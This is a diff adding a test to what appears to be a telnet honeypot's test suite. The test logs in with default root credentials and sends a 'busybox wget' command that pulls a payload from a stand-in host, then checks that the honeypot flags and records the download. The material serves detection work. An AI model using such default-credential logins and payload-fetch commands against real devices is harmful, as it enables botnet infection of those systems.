@@ -132,3 +132,33 @@ def test_telnet_iac_stripped_from_credentials(tmp_path):
     assert creds, "no credentials event"
     assert creds[0]["request"]["user"] == "root"   # IAC bytes stripped
     assert creds[0]["request"]["password"] == "admin"
+
+
+def test_telnet_shell_captures_commands_and_payload_pull(tmp_path):
+    svc, sink, log = _mksvc(tmp_path, accept_after=1, bruteforce_threshold=99)
+
+    async def scenario():
+        await svc.start()
+        port = svc._server.sockets[0].getsockname()[1]
+        reader, writer = await asyncio.open_connection("127.0.0.1", port)
+        await _login(reader, writer, b"root", b"root")     # accepted (accept_after=1)
+        await reader.readuntil(b"# ")                       # shell prompt
+        writer.write(b"busybox wget http://10.0.0.9/m\r\n"); await writer.drain()
+        await reader.readuntil(b"# ")                       # canned output + next prompt
+        writer.write(b"exit\r\n"); await writer.drain()
+        await asyncio.sleep(0.1)
+        writer.close()
+        try:
+            await writer.wait_closed()
+        except Exception:
+            pass
+        await svc.stop()
+
+    asyncio.run(scenario())
+    sink.close()
+    events = _wait_for_events(log)
+    pull = [e for e in events if "telnet-payload-pull" in e.get("tags", [])]
+    assert pull, "no telnet-payload-pull signal"
+    assert pull[0]["request"]["tool"] == "wget"
+    assert pull[0]["request"]["url"] == "http://10.0.0.9/m"
+    assert pull[0]["service"] == "telnet"
